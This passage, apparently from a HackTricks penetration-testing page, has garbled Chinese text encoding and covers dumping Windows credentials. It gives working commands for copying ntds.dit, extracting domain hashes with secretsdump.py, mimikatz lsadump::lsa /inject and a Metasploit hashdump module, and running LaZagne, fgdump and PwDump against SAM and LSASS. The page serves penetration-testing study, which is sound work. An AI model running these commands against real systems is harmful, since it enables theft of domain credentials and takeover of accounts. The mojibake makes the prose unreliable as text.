<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <a href="./#stealing-sam-and-system"><strong>å·å½±å¤åˆ¶</strong></a> æŠ€å·§æ¥å¤åˆ¶ <strong>ntds.dit</strong> æ–‡ä»¶ã€‚è¯·è®°ä½ï¼Œæ‚¨è¿˜éœ€è¦ <strong>SYSTEM æ–‡ä»¶</strong> çš„å‰¯æœ¬ï¼ˆåŒæ ·ï¼Œæ‚¨å¯ä»¥ <a href="./#stealing-sam-and-system"><strong>ä»æ³¨å†Œè¡¨è½¬å‚¨æˆ–ä½¿ç”¨å·å½±å¤åˆ¶</strong></a> æŠ€å·§ï¼‰ã€‚</p>
<h3 id="ä»-ntdsdit-ä¸­æå–å“ˆå¸Œ"><a class="header" href="#ä»-ntdsdit-ä¸­æå–å“ˆå¸Œ"><strong>ä» NTDS.dit ä¸­æå–å“ˆå¸Œ</strong></a></h3>
<p>ä¸€æ—¦æ‚¨ <strong>è·å¾—</strong> äº† <strong>NTDS.dit</strong> å’Œ <strong>SYSTEM</strong> æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åƒ <em>secretsdump.py</em> è¿™æ ·çš„å·¥å…·æ¥ <strong>æå–å“ˆå¸Œ</strong>ï¼š</p>
<pre><code class="language-bash">secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æœ‰æ•ˆçš„åŸŸç®¡ç†å‘˜ç”¨æˆ·<strong>è‡ªåŠ¨æå–å®ƒä»¬</strong>ï¼š</p>
<pre><code>secretsdump.py -just-dc-ntlm &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DOMAIN_CONTROLLER&gt;
</code></pre>
<p>å¯¹äº <strong>å¤§ NTDS.dit æ–‡ä»¶</strong>ï¼Œå»ºè®®ä½¿ç”¨ <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> è¿›è¡Œæå–ã€‚</p>
<p>æœ€åï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>metasploit æ¨¡å—</strong>ï¼š<em>post/windows/gather/credentials/domain_hashdump</em> æˆ– <strong>mimikatz</strong> <code>lsadump::lsa /inject</code></p>
<h3 id="ä»-ntdsdit-æå–åŸŸå¯¹è±¡åˆ°-sqlite-æ•°æ®åº“"><a class="header" href="#ä»-ntdsdit-æå–åŸŸå¯¹è±¡åˆ°-sqlite-æ•°æ®åº“"><strong>ä» NTDS.dit æå–åŸŸå¯¹è±¡åˆ° SQLite æ•°æ®åº“</strong></a></h3>
<p>NTDS å¯¹è±¡å¯ä»¥ä½¿ç”¨ <a href="https://github.com/almandin/ntdsdotsqlite">ntdsdotsqlite</a> æå–åˆ° SQLite æ•°æ®åº“ä¸­ã€‚ä¸ä»…æå–äº†ç§˜å¯†ï¼Œè¿˜æå–äº†æ•´ä¸ªå¯¹è±¡åŠå…¶å±æ€§ï¼Œä»¥ä¾¿åœ¨åŸå§‹ NTDS.dit æ–‡ä»¶å·²è¢«æ£€ç´¢æ—¶è¿›è¡Œè¿›ä¸€æ­¥çš„ä¿¡æ¯æå–ã€‚</p>
<pre><code>ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
</code></pre>
<p>The <code>SYSTEM</code> hive æ˜¯å¯é€‰çš„ï¼Œä½†å…è®¸è§£å¯†ç§˜å¯†ï¼ˆNT å’Œ LM å“ˆå¸Œã€è¡¥å……å‡­æ®ï¼Œå¦‚æ˜æ–‡å¯†ç ã€kerberos æˆ–ä¿¡ä»»å¯†é’¥ã€NT å’Œ LM å¯†ç å†å²ï¼‰ã€‚é™¤äº†å…¶ä»–ä¿¡æ¯å¤–ï¼Œæå–ä»¥ä¸‹æ•°æ®ï¼šç”¨æˆ·å’Œæœºå™¨è´¦æˆ·åŠå…¶å“ˆå¸Œã€UAC æ ‡å¿—ã€æœ€åç™»å½•å’Œå¯†ç æ›´æ”¹çš„æ—¶é—´æˆ³ã€è´¦æˆ·æè¿°ã€åç§°ã€UPNã€SPNã€ç»„å’Œé€’å½’æˆå‘˜èµ„æ ¼ã€ç»„ç»‡å•ä½æ ‘å’Œæˆå‘˜èµ„æ ¼ã€å—ä¿¡ä»»çš„åŸŸåŠå…¶ä¿¡ä»»ç±»å‹ã€æ–¹å‘å’Œå±æ€§...</p>
<h2 id="lazagne"><a class="header" href="#lazagne">Lazagne</a></h2>
<p>ä» <a href="https://github.com/AlessandroZ/LaZagne/releases">è¿™é‡Œ</a> ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤äºŒè¿›åˆ¶æ–‡ä»¶ä»å¤šä¸ªè½¯ä»¶ä¸­æå–å‡­æ®ã€‚</p>
<pre><code>lazagne.exe all
</code></pre>
<h2 id="ä»samå’Œlsassæå–å‡­æ®çš„å…¶ä»–å·¥å…·"><a class="header" href="#ä»samå’Œlsassæå–å‡­æ®çš„å…¶ä»–å·¥å…·">ä»SAMå’ŒLSASSæå–å‡­æ®çš„å…¶ä»–å·¥å…·</a></h2>
<h3 id="windowså‡­æ®ç¼–è¾‘å™¨wce"><a class="header" href="#windowså‡­æ®ç¼–è¾‘å™¨wce">Windowså‡­æ®ç¼–è¾‘å™¨ï¼ˆWCEï¼‰</a></h3>
<p>æ­¤å·¥å…·å¯ç”¨äºä»å†…å­˜ä¸­æå–å‡­æ®ã€‚ä¸‹è½½åœ°å€ï¼š<a href="https://www.ampliasecurity.com/research/windows-credentials-editor/">http://www.ampliasecurity.com/research/windows-credentials-editor/</a></p>
<h3 id="fgdump"><a class="header" href="#fgdump">fgdump</a></h3>
<p>ä»SAMæ–‡ä»¶ä¸­æå–å‡­æ®</p>
<pre><code>You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
</code></pre>
<h3 id="pwdump"><a class="header" href="#pwdump">PwDump</a></h3>
<p>ä»SAMæ–‡ä»¶ä¸­æå–å‡­æ®</p>
<pre><code>You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
</code></pre>
<h3 id="pwdump7"><a class="header" href="#pwdump7">PwDump7</a></h3>
<p>ä»ï¼š<a href="http://www.tarasco.org/security/pwdump_7"> http://www.tarasco.org/security/pwdump_7</a> ä¸‹è½½å¹¶<strong>æ‰§è¡Œå®ƒ</strong>ï¼Œå¯†ç å°†è¢«æå–ã€‚</p>
<h2 id="é˜²å¾¡"><a class="header" href="#é˜²å¾¡">é˜²å¾¡</a></h2>
<p><a href="credentials-protections.html"><strong>åœ¨è¿™é‡Œäº†è§£ä¸€äº›å‡­è¯ä¿æŠ¤ã€‚</strong></a></p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/stealing-credentials/credentials-protections.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/stealing-credentials/credentials-protections.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
